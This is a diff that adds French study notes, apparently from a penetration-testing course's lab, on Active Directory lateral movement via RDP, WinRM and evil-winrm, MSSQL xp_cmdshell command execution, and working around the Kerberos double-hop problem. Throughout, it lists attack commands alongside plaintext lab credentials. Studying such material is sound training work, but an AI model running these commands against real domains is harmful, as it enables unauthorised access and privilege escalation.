@@ -1429,5 +1429,185 @@ Afficher les mots de passe en clair extraits (si disponibles) :
 
 ---
 
+# Privileged Access
+
+Une fois un accès dans un domaine obtenu, l’objectif est de progresser (latéral ou vertical) pour viser d’autres hôtes, comptes, ou le DA.
+
+Plusieurs techniques existent, même sans droits admin locaux :
+
+- **RDP (Remote Desktop Protocol)** : accès distant avec interface graphique.
+- **PowerShell Remoting (PSRemoting/WinRM)** : exécution de commandes/sessions PowerShell à distance.
+- **MSSQL Server** : un compte `sysadmin` peut exécuter des commandes OS via SQL Server.
+
+Pour la cartographie des droits d’accès distants, BloodHound repère notamment :
+
+- `CanRDP`
+- `CanPSRemote`
+- `SQLAdmin`
+
+PowerView ou les outils Windows natifs permettent aussi d’énumérer.
+
+## RDP
+
+Enumérer les membres du groupe Remote Desktop Users sur un hôte :
+
+`Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"`
+
+Si la sortie contient `INLANEFREIGHT\Domain Users`, alors tous les utilisateurs du domaine peuvent ouvrir une session RDP.
+
+## WinRM (PSRemoting)
+
+Enumérer les membres du groupe Remote Management Users :
+
+`Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"`
+
+Ouvrir une session WinRM depuis Windows :
+
+- Créer un SecureString :
+  
+  `$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force`
+- Créer un credential :
+  
+  `$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)`
+- Se connecter :
+  
+  `Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred`
+- Fermer la session :  
+  `Exit-PSSession`
+
+Depuis un hôte Linux, installer evil-winrm :
+
+`gem install evil-winrm`
+
+Se connecter :
+
+`evil-winrm -i 10.129.201.234 -u forend`
+
+## MSSQL Server (SQLAdmin)
+
+Lister les instances MSSQL avec PowerUpSQL :
+
+`Import-Module .\PowerUpSQL.ps1`  
+`Get-SQLInstanceDomain`
+
+Authentification et exécution de requête :
+
+`Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'`
+
+Depuis Linux avec mssqlclient.py :
+
+`mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth`
+
+Dans la console interactive MSSQL :
+
+- Voir l’aide : `help`
+- Activer xp_cmdshell : `enable_xp_cmdshell`
+- Exécuter une commande OS : `xp_cmdshell whoami /priv`
+
+## Points à surveiller
+
+- Toujours vérifier les droits RDP/WinRM d’un user, même sans droits admin local.
+- L’accès SQL avec `sysadmin` mène quasi toujours à SYSTEM si le privilège `SeImpersonatePrivilege` ou autre est présent.
+- Enumération et attaques sont itératives : rejouer l’énum sur chaque nouveau compte/hôte compromis.
+
+---
+
+# Kerberos "Double Hop" Problem
+
+## Présentation
+
+Le "double hop" est un problème lors de l’authentification Kerberos sur plusieurs sauts (ex : accès WinRM sur une machine distante, puis tentative d’accès à un autre service/domaine depuis cette machine).  
+Avec Kerberos, chaque ticket est valable pour une ressource précise. Un ticket n’est pas un mot de passe : c’est une autorisation signée par le KDC.
+
+Avec NTLM (ex : `psexec`), le hash NTLM reste en mémoire, donc possible d’accéder à d’autres ressources depuis la session distante.
+
+Avec WinRM/Kerberos, le mot de passe n’est jamais stocké : impossible de réutiliser l’authentification sur un second hop (ex : accès DC depuis une session WinRM ouverte sur un poste distant).
+
+## Symptômes du "double hop" (WinRM/Kerberos)
+
+- Sur un shell distant ouvert par `Enter-PSSession` ou `evil-winrm`, pas de credentials en mémoire (`sekurlsa::logonpasswords` dans mimikatz = vide pour l’user).
+- Tentative d’accès AD : échec car le TGT Kerberos n’est pas transféré.
+- `klist` : seul un ticket pour le serveur cible est en cache, pas pour le DC.
+- Pas d’accès à des ressources secondaires (ex : partages SMB, LDAP, AD...).
+
+## Exemple d’erreur
+
+Sur le shell distant (exemple : PowerView pour requêter l’AD) :
+
+`get-domainuser -spn`
+
+Erreur typique :  
+`Exception calling "FindAll" with "0" argument(s): "An operations error occurred."`
+
+## Cas RDP (pas concerné)
+
+Si la connexion est faite en RDP (avec mot de passe), le mot de passe est stocké et transmis à chaque requête, donc aucun souci de double hop.  
+Exemple :  
+`klist` en RDP affiche tous les tickets nécessaires pour atteindre AD/DC/partages.
+
+## Solutions
+
+### 1. Passer explicitement un PSCredential
+
+Après ouverture de session, créer un objet PSCredential et l’ajouter à chaque commande qui nécessite un accès secondaire.
+
+- Générer le SecureString :  
+  `$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force`
+- Générer le credential :  
+  `$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)`
+- Utiliser PowerView avec le flag `-credential` :  
+  `get-domainuser -spn -credential $Cred | select samaccountname`
+
+À chaque requête AD ou secondaire, ajouter le paramètre : `-credential $Cred`.
+
+Sans ce paramètre, même commande = erreur.
+
+### 2. Register-PSSessionConfiguration (uniquement depuis une console PowerShell GUI/admin)
+
+- Sur la machine distante, enregistrer une nouvelle config de session qui utilise le compte cible :
+  
+  `Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm`
+  
+- Redémarrer le service :
+  
+  `Restart-Service WinRM`
+  
+- Ouvrir une nouvelle session :
+  
+  `Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess`
+  
+- Vérifier les tickets :
+  
+  `klist` (doit montrer le TGT pour DC)
+
+Permet d’utiliser des outils type PowerView sans avoir à repasser un credential à chaque commande.
+
+**Attention** :  
+- Impossible à faire via `evil-winrm` ou PowerShell sous Linux, nécessite une session GUI/elevated.
+- Peut nécessiter des droits d’admin sur la machine cible.
+
+## Contournements alternatifs
+
+- **CredSSP** : permet le "delegation" (hors scope ici)
+- **Port forwarding**
+- **Injection de token (sacrificial process)**
+- **Unconstrained delegation** : si activé, le TGT de l’utilisateur est transféré au serveur cible (rare, mais gros problème de sécu si présent).
+
+## À retenir
+
+- Le double hop est **fréquent** lors des mouvements latéraux avec WinRM/Kerberos.
+- Pour le bypass : toujours penser à repasser explicitement un PSCredential, ou utiliser une console GUI/Jump host.
+- Tester toujours l’accès avec/et sans le flag `-credential` pour valider la présence du problème.
+
+## Commandes clés
+
+`Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm`  
+`klist`  
+`Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm`  
+`Restart-Service WinRM`  
+`get-domainuser -spn -credential $Cred | select samaccountname`
+
+--- 
+
 
 
